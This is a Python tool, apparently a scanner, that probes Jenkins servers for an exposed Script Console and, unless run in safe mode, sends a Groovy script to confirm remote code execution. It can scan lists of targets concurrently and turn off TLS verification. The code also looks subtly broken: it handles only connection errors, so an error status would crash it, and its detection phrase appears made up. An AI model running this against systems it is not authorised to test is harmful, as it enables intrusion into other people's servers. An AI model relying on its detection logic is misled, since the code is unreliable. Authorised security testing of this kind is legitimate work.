#!/usr/bin/env python3
"""
Jenkins Script Console Remote Code Execution (RCE)
==================================================
Scans for Jenkins servers with the Script Console exposed, which can allow attackers
to execute arbitrary Groovy scripts and achieve RCE. This vulnerability is a result
of improper permissions or misconfiguration, and affects Jenkins instances where
administrator access is not restricted properly or secured.

Details:
  - Impact: High - Attackers can execute arbitrary system commands.
  - Risk: If the Script Console is exposed and access is not restricted, attackers
          gain full control over the Jenkins server.
  - Affected: Jenkins servers with incorrectly configured security settings permitting
              unauthenticated or low-privileged users to access the script console.

Usage:
  # Scan a single Jenkins server
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com:8080

  # Detection only — do not attempt RCE exploitation
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com:8080 --safe

  # Bulk scan from a list of servers in a text file
  python jenkins_script_console_rce_scanner.py --list servers.txt --output findings.json

  # Adjust concurrency for faster scanning
  python jenkins_script_console_rce_scanner.py --list servers.txt --concurrency 10

References:
  - https://www.jenkins.io/doc/book/managing/script-console/
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1000861
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME = "jenkins_script_console_rce_scanner"
RCE_PROBE_SCRIPT = "println(System.getProperty('os.name'))"  # Basic OS detection script
CHECK_ENDPOINT = "/script"
VALIDATION_PHRASE = "Groovy script executed"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 20


async def fetch(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL asynchronously and return the response, or None on failure."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except httpx.RequestError:
        return None


async def execute_script(client: httpx.AsyncClient, url: str, script: str) -> Optional[str]:
    """Execute a Groovy script and return the response contents or None on failure."""
    try:
        response = await client.post(
            url,
            data={"script": script},
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        return response.text
    except httpx.RequestError:
        return None


async def scan_target(client: httpx.AsyncClient, target: str, safe: bool) -> dict:
    """
    Scan an individual target for an exposed Jenkins Script Console.

    Args:
        client: The HTTPX client instance.
        target: The target URL.
        safe: Whether to skip active exploitation (safe mode).

    Returns:
        A dictionary with scan results.
    """
    result = {
        "target": target,
        "is_exposed": False,
        "rce": None,
        "error": None,
    }

    print(f"{c(CYAN, '[INFO]')} Scanning {target}...")

    response = await fetch(client, f"{target.rstrip('/')}{CHECK_ENDPOINT}")

    if response and VALIDATION_PHRASE in response.text:
        result["is_exposed"] = True
        print(f"{c(YELLOW, '[HIGH]')} Exposed Script Console detected on {target}")

        if not safe:
            print(f"{c(YELLOW, '[INFO]')} Attempting RCE on {target}...")
            rce_response = await execute_script(
                client, f"{target.rstrip('/')}{CHECK_ENDPOINT}", RCE_PROBE_SCRIPT
            )
            if rce_response:
                result["rce"] = rce_response.strip()
                print(f"{c(RED, '[CRITICAL]')} RCE successful on {target}: {result['rce']}")
    elif response:
        print(f"{c(GREEN, '[INFO]')} No Script Console exposure detected on {target}")
    else:
        result["error"] = "Failed to connect or unexpected error."
        print(f"{c(RED, '[ERROR]')} Unable to scan {target}")

    return result


async def main(args: argparse.Namespace) -> None:
    """Main logic for the scanner."""
    targets = []
    if args.target:
        targets = [args.target]
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    if not targets:
        print(f"{c(RED, '[ERROR]')} No targets specified.")
        return

    results = []
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        async def limited_scan(target):
            async with semaphore:
                return await scan_target(client, target, args.safe)

        tasks = [limited_scan(target) for target in targets]
        for task in asyncio.as_completed(tasks):
            results.append(await task)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"{c(GREEN, '[INFO]')} Results saved to {args.output}")

    # Display summary
    exposed_count = sum(1 for r in results if r["is_exposed"])
    print(f"\n{c(BOLD, '[SUMMARY]')} {exposed_count}/{len(results)} targets have an exposed Script Console.")
    for result in results:
        print(result)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Scan for Jenkins servers with an exposed Script Console endpoint."
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--target", help="Target Jenkins server (e.g., http://localhost:8080)")
    group.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="File to save JSON scan results")
    parser.add_argument("--safe", action="store_true", help="Detection only, no exploitation attempts")
    parser.add_argument(
        "--concurrency", type=int, default=SEMAPHORE_LIMIT,
        help=f"Number of concurrent requests (default: {SEMAPHORE_LIMIT})"
    )
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    asyncio.run(main(args))
